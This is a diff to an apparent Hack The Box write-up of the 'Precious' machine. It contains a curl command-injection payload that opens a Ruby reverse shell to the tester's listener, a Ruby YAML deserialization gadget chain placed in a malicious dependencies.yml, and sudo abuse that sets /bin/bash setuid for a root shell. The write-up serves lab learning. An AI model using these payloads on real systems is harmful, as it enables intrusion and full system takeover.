@@ -26,6 +26,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Enumerated UDP ports:
 
 ```
+N/A
 ```
 
 Notes:
@@ -45,7 +46,7 @@ Notes:
 
 #### Directory Bruteforce
 
-```
+```bash
 dirsearch -u http://precious.htb
 ```
 
@@ -172,7 +173,7 @@ Let's download any generated PDF and read it's metadata contents with `exiftool`
 
 <figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption><p>Trigger the download from the browser</p></figcaption></figure>
 
-```
+```bash
 exiftool ~/Downloads/u3k8cdohntpcw26oda5vcsnjcq8vo8k6.pdf
 ```
 
@@ -202,13 +203,13 @@ After I was able to confirm code execution was taking place, the next logical st
 
 Start HTTP server:
 
-```
+```bash
 python3 -m http.server 80
 ```
 
 Start nc listener:
 
-```
+```bash
 nc -lnvp 1337
 ```
 
@@ -217,7 +218,7 @@ Via Curl Method:&#x20;
 PoC:
 
 {% code overflow="wrap" %}
-```
+```bash
 CURL (modify bold values): curl 'TARGET-URL' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: TARGET_URL' -H 'Connection: keep-alive' -H 'Referer: TARGET_URL' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2FLOCAL-IP%3ALOCAL-HTTP-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22LOCAL-IP%22%2CLOCAL-LISTEN-PORT%29%29%27%60'
 ```
 {% endcode %}
@@ -225,7 +226,7 @@ CURL (modify bold values): curl 'TARGET-URL' -X POST -H 'User-Agent: Mozilla/5.0
 Working Exploit:
 
 {% code overflow="wrap" %}
-```
+```bash
 curl 'http://precious.htb' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://precious.htb' -H 'Connection: keep-alive' -H 'Referer: http://precious.htb' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2F10.10.14.97%3A80%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.14.97%22%2C1337%29%29%27%60'
 ```
 {% endcode %}
@@ -271,13 +272,6 @@ We spawned in as the <mark style="color:yellow;">ruby</mark> user. There is anot
 * I was unable to find anything where I spawned unfortunately
 * There is strange port running internally -- 127.0.0.1:35389
   * Tried curling but it returned "request empty" maybe we should google this
-*
-
-#### File System Enumeration
-
-```
-// Some code
-```
 
 #### Linpeas
 
@@ -349,7 +343,7 @@ User henry may run the following commands on precious:
 
 /opt/update\_dependencies.rb:
 
-```
+```ruby
 # Compare installed dependencies with those specified in "dependencies.yml"
 require "yaml"
 require 'rubygems'
@@ -382,5 +376,91 @@ gems_file.each do |file_name, file_version|
 end
 ```
 
+When we try to execute /opt/update\_dependencies.rb with sudo permissions, we get an error that a file does not exist (dependencies.rb).
 
+We can see that it is trying to pull data from a file named `dependencies.yml`.
+
+Inside of /opt/sample/dependencies.yml, we can see yaml 0.1.1 and pdfkit v.0.8.6
+
+Doing some OSINT on yaml 0.1.1, I was able to find a deserialization remote code execution exploit:
+
+{% embed url="https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/" %}
+
+* This appears to be the way that we have to go about escalating our privileges
+
+```yaml
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: id
+         method_id: :resolveub
+```
+
+* From here, we can quickly identify the linux command `id` which points us in the direction of where we can inject a malicious command rather than `id`
+* How about we simply place `chmod +s /bin/bash`?
+
+<mark style="color:yellow;">Time to create a malicious dependencies.yaml file that the /opt/update\_dependencies.rb file will call with sudo permissions</mark>:
+
+dependencies.yaml:
+
+```
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: chmod +s /bin/bash
+         method_id: :resolveub
+```
+
+Now execute the script with sudo permissions:
+
+```
+sudo /usr/bin/ruby /opt/update_dependencies.rb
+```
+
+<mark style="color:yellow;">Note</mark>: you will get errors, ignore them.
+
+Now, check the permissions of `/bin/bash`:
+
+```bash
+ls -la /bin/bash
+-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+```
+
+<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+
+Gain root shell in /bin/bash:
+
+```
+/bin/bash -p
+```
+
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption><p>proof.txt</p></figcaption></figure>
 
